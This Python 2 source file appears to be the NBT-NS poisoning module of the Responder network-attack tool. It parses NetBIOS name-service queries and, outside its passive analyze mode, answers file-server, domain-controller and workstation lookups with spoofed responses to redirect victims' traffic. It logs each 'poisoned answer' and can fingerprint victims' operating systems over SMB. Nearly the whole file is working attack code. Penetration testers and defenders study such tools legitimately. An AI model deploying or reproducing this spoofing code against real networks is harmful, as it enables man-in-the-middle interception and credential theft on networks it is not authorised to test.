import socket
import settings
import string
import fingerprint

from packets import NBT_Ans
from SocketServer import BaseRequestHandler
from utils import *

def NBT_NS_Role(data):
	Role = {
		"\x41\x41\x00":"Workstation/Redirector Service.",
		"\x42\x4c\x00":"Domain Master Browser. This name is likely a domain controller or a homegroup.)",
		"\x42\x4d\x00":"Domain controller service. This name is a domain controller.",
		"\x42\x4e\x00":"Local Master Browser.",
		"\x42\x4f\x00":"Browser Election Service.",
		"\x43\x41\x00":"File Server Service.",
		"\x41\x42\x00":"Browser Service.",
	}

	if data in Role:
		return Role[data]
	else:
		return "Service not known."

# Define what are we answering to.
def Validate_NBT_NS(data):
	if settings.Config.AnalyzeMode:
		return False

	if NBT_NS_Role(data[43:46]) == "File Server Service.":
		return True

	if settings.Config.NBTNSDomain == True:
		if NBT_NS_Role(data[43:46]) == "Domain controller service. This name is a domain controller.":
			return True

	if settings.Config.Wredirect == True:
		if NBT_NS_Role(data[43:46]) == "Workstation/Redirector Service.":
			return True

	else:
		return False

def Decode_Name(nbname):
	#From http://code.google.com/p/dpkt/ with author's permission.
	try:
		if len(nbname) != 32:
			return nbname
		l = []
		for i in range(0, 32, 2):
			l.append(chr(((ord(nbname[i]) - 0x41) << 4) |
					   ((ord(nbname[i+1]) - 0x41) & 0xf)))
		return filter(lambda x: x in string.printable, ''.join(l).split('\x00', 1)[0].replace(' ', ''))
	except:
		return "Illegal NetBIOS name"

# NBT_NS Server class.
class NBTNS(BaseRequestHandler):

	def handle(self):

		data, socket = self.request
		Name = Decode_Name(data[13:45])

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == "\x01\x10":

			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0],445))
			else:
				Finger = None

			# Analyze Mode
			if settings.Config.AnalyzeMode:
				Filename   = settings.Config.AnalyzeFilename
				LineHeader = "[Analyze mode: NBT-NS]"
				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)

			# Poisoning Mode
			else:
				Buffer = NBT_Ans()
				Buffer.calculate(data)
				socket.sendto(str(Buffer), self.client_address)

				Filename   = settings.Config.Log2Filename
				LineHeader = "[NBT-NS]"

				print color("%s Poisoned answer sent to %s for name %s (service: %s)" % (LineHeader, self.client_address[0], Name, NBT_NS_Role(data[43:46])), 2, 1)

			if Finger is not None:
				print text("%s [FINGER] OS Version     : %s" % (LineHeader, color(Finger[0], 3, 0)))
				print text("%s [FINGER] Client Version : %s" % (LineHeader, color(Finger[1], 3, 0)))
